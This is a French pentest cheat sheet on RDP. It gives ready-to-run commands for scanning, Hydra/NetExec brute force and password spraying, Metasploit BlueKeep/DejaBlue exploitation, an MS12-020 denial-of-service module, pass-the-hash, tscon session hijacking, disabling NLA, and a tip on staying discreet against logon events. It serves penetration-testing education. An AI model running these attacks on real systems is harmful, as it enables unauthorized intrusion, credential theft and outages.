# RDP Enumeration

RDP (Remote Desktop Protocol) est le protocole de bureau à distance de Microsoft opérant sur le port 3389. Massivement utilisé dans les environnements Windows et Active Directory pour l'administration distante, il est une cible de choix en pentest pour le bruteforce de credentials, l'exploitation de vulnérabilités critiques (BlueKeep, DejaBlue) et le mouvement latéral.

## Objectifs

- Identifier les serveurs RDP exposés
- Détecter la version et les configurations
- Tester les credentials par défaut ou faibles
- Identifier des versions vulnérables (BlueKeep, EternalBlue)
- Exploiter les mauvaises configurations (NLA désactivé, etc.)
- Utiliser RDP pour le mouvement latéral

## Ports

| Port | Service |
|---|---|
| 3389 | RDP (par défaut) |
| 3388 | RDP (alternatif courant) |
| 3390 | RDP (alternatif) |

## Quick Enumeration

::: code-group
```bash [Nmap]
nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 <target>
```
```bash [NetExec]
nxc rdp <target>
nxc rdp <target> -u user -p password
```
```bash [Hydra]
hydra -L users.txt -P passwords.txt rdp://<target>
```
```bash [Metasploit]
use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/rdp/ms12_020_check
```

:::

## Workflow Pentest
```
1. Scan du port 3389
2. Identification de la version RDP
3. Vérification du niveau NLA (Network Level Authentication)
4. Vérification des vulnérabilités (BlueKeep, DejaBlue)
5. Test des credentials par défaut
6. Bruteforce / Password spraying
7. Connexion RDP avec credentials obtenus
8. Pass-the-Hash via RDP (Restricted Admin Mode)
9. Mouvement latéral
```

## Nmap

### Scan basique
```bash
nmap -p3389 <target>
```

### Détection version
```bash
nmap -p3389 -sV <target>
```

### Scripts NSE
```bash
# Niveau de chiffrement RDP
nmap -p3389 --script rdp-enum-encryption <target>

# Vulnérabilité MS12-020 (DoS)
nmap -p3389 --script rdp-vuln-ms12-020 <target>

# Info RDP
nmap -p3389 --script rdp-* <target>

# BlueKeep — CVE-2019-0708
nmap -p3389 --script rdp-vuln-ms19-0708 <target>

# Full scan
nmap -p3389 -sV --script rdp-* <target>
```

## Enumeration

### Banner grabbing

::: code-group
```bash [Netcat]
nc -nv <target> 3389
```
```bash [NetExec]
nxc rdp <target>
nxc rdp 192.168.1.0/24
```
```bash [Metasploit]
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <target>
run
```

:::

### Vérification NLA
```bash
# Via nmap
nmap -p3389 --script rdp-enum-encryption <target>

# Via NetExec
nxc rdp <target>

# NLA désactivé = plus facile à exploiter
# NLA activé = credentials requis avant l'établissement de la session
```

### Vérification des vulnérabilités
```bash
# BlueKeep — CVE-2019-0708
nmap -p3389 --script rdp-vuln-ms19-0708 <target>

# Via Metasploit
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <target>
run

# MS12-020
nmap -p3389 --script rdp-vuln-ms12-020 <target>

use auxiliary/scanner/rdp/ms12_020_check
set RHOSTS <target>
run
```

## Credentials Attacks

### Bruteforce Hydra
```bash
# User unique
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<target>

# Liste d'users
hydra -L users.txt -P passwords.txt rdp://<target>

# Avec domaine
hydra -l domain\\user -P passwords.txt rdp://<target>

# Threads réduits (RDP limite les connexions)
hydra -L users.txt -P passwords.txt rdp://<target> -t 4
```

### Password spraying NetExec
```bash
# Un mot de passe sur tous les users
nxc rdp <target> -u users.txt -p Password123!

# Sur un subnet
nxc rdp 192.168.1.0/24 -u Administrator -p Password123!

# Avec domaine
nxc rdp <target> -u users.txt -p Password123! -d domain.com
```

### Bruteforce Metasploit
```bash
use auxiliary/scanner/rdp/rdp_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

### Crowbar
```bash
# Bruteforce RDP
crowbar -b rdp -s <target>/32 -u user -C passwords.txt

# Avec liste d'users
crowbar -b rdp -s <target>/32 -U users.txt -C passwords.txt
```

## Exploitation

### Vulnérabilités critiques

| CVE | Nom | Versions affectées | Impact |
|---|---|---|---|
| CVE-2019-0708 | BlueKeep | Windows 7, Server 2008 | RCE non authentifié |
| CVE-2019-1181 | DejaBlue | Windows 8-10, Server 2012-2019 | RCE non authentifié |
| CVE-2019-1182 | DejaBlue | Windows 8-10, Server 2012-2019 | RCE non authentifié |
| CVE-2012-0002 | MS12-020 | Toutes versions | DoS |
| CVE-2021-34535 | RDP Client | Windows 10, Server 2019 | RCE côté client |

### BlueKeep — CVE-2019-0708
```bash
# Vérification
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <target>
run

# Exploitation
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target>
set TARGET 2   # Adapter selon la version Windows
run
```

### DejaBlue — CVE-2019-1181/1182
```bash
# Via Metasploit
use exploit/windows/rdp/cve_2019_1181_bluekeep
set RHOSTS <target>
run
```

### MS12-020 — DoS
```bash
# Vérification
use auxiliary/scanner/rdp/ms12_020_check
set RHOSTS <target>
run

# DoS (attention — crash le serveur)
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set RHOSTS <target>
run
```

## Connexion RDP

### xfreerdp

::: code-group
```bash [Basique]
xfreerdp /u:user /p:password /v:<target>
```
```bash [Avec domaine]
xfreerdp /u:user /p:password /d:domain.com /v:<target>
```
```bash [Pass-the-Hash]
xfreerdp /u:user /pth:NTLMhash /v:<target>
```
```bash [Ignorer certificat]
xfreerdp /u:user /p:password /v:<target> /cert-ignore
```
```bash [Plein écran]
xfreerdp /u:user /p:password /v:<target> /f
```
```bash [Résolution personnalisée]
xfreerdp /u:user /p:password /v:<target> /w:1920 /h:1080
```
```bash [Partage de dossier]
xfreerdp /u:user /p:password /v:<target> /drive:share,/tmp
```

:::

### rdesktop
```bash
rdesktop <target>
rdesktop -u user -p password <target>
rdesktop -u user -p password -d domain <target>
rdesktop -u user -p password -g 1920x1080 <target>
```

### Remmina (GUI)
```bash
remmina &
# Configurer via interface graphique
```

## Pass-the-Hash via RDP

Le Pass-the-Hash via RDP nécessite que le **Restricted Admin Mode** soit activé sur la cible.
```bash
# Vérifier si Restricted Admin Mode est activé
reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

# Activer Restricted Admin Mode (si admin local)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Connexion Pass-the-Hash
xfreerdp /u:Administrator /pth:NTLMhash /v:<target> /cert-ignore

# Via Impacket
impacket-rdp_check domain/user@<target> -hashes :NTLMhash
```

## Mouvement Latéral via RDP
```bash
# Lister les sessions RDP actives
nxc rdp 192.168.1.0/24 -u user -p password

# Connexion vers machine interne via pivot
xfreerdp /u:user /p:password /v:192.168.1.10 /proxy:socks5://127.0.0.1:1080

# Via ProxyChains
proxychains xfreerdp /u:user /p:password /v:<internal_target>

# Session hijacking (si SYSTEM)
# Lister les sessions
query session
# Connecter à une session existante
tscon <session_id> /dest:console
```

## Screenshot à distance
```bash
# Via NetExec
nxc rdp <target> -u user -p password --screenshot

# Via rdesktop
rdesktop <target> -u user -p password -g 1024x768 -r clipboard:CLIPBOARD

# Via Metasploit post module
use post/multi/manage/screenshot
```

## Mauvaises Configurations

### Paramètres à vérifier

| Configuration | Risque |
|---|---|
| NLA désactivé | Connexion sans pré-authentification |
| Restricted Admin Mode activé | Pass-the-Hash possible |
| PermitRootLogin | Accès administrateur direct |
| Encryption Level faible | Interception du trafic |
| Session non chiffrée | MITM possible |
| Compte Guest activé | Accès non authentifié |

### Vérification via registre
```cmd
# NLA
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication

# Restricted Admin Mode
reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

# RDP activé
reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

# Niveau de chiffrement
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MinEncryptionLevel
```

## Activer / Désactiver RDP
```cmd
# Activer RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Ouvrir le firewall
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow

# Désactiver NLA (si admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Désactiver RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

## Points d'attaque

- NLA désactivé connexion sans pré-authentification
- Version Windows non patchée (BlueKeep, DejaBlue)
- Credentials faibles ou par défaut sur le compte Administrator
- Restricted Admin Mode activé Pass-the-Hash possible
- RDP exposé sur Internet sans VPN
- Compte Guest actif avec accès RDP
- Chiffrement faible configuré
- Absence de verrouillage après tentatives échouées

::: info Tips 

- `nxc rdp 192.168.1.0/24` permet de cartographier rapidement tous les serveurs RDP d'un réseau
- NLA désactivé est un indicateur fort de mauvaise configuration tenter une connexion anonyme
- Le Pass-the-Hash via RDP (`xfreerdp /pth:`) est très utile quand le crack du hash est impossible
- `tscon` permet de se connecter à une session RDP active sans connaître le mot de passe nécessite SYSTEM
- BlueKeep affecte uniquement Windows 7 et Server 2008 encore présents dans de nombreux environnements legacy
- Toujours tester `Administrator:Administrator`, `Administrator:Password123!` et `Administrator:<company_name>`
- RDP génère des Event ID 4624 (logon) et 4778/4779 (session connect/disconnect) rester discret

:::


::: details Checklist

- Port 3389 ouvert identifié
- Version Windows détectée
- NLA vérifié (activé / désactivé)
- Vulnérabilités BlueKeep / DejaBlue vérifiées
- Credentials par défaut testés
- Bruteforce / password spraying effectué
- Connexion RDP établie
- Pass-the-Hash tenté (Restricted Admin Mode)
- Sessions actives énumérées
- Mouvement latéral effectué

:::

## Notes
```
 # Notes terrain
``` 


## Tools

- [Nmap](https://nmap.org/)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [xfreerdp](https://github.com/FreeRDP/FreeRDP)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Crowbar](https://github.com/galkan/crowbar)
- [Metasploit](https://www.metasploit.com/)
- [rdesktop](https://www.rdesktop.org/)
- [Remmina](https://remmina.org/)

## Ressources

- [HackTricks — RDP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp)
- [PayloadsAllTheThings — RDP](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [BlueKeep CVE-2019-0708](https://nvd.nist.gov/vuln/detail/CVE-2019-0708)
- [DejaBlue CVE-2019-1181](https://nvd.nist.gov/vuln/detail/CVE-2019-1181)
- [Microsoft RDP Security Guide](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/)




<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/enumeration/rdp.md)</span>

</div>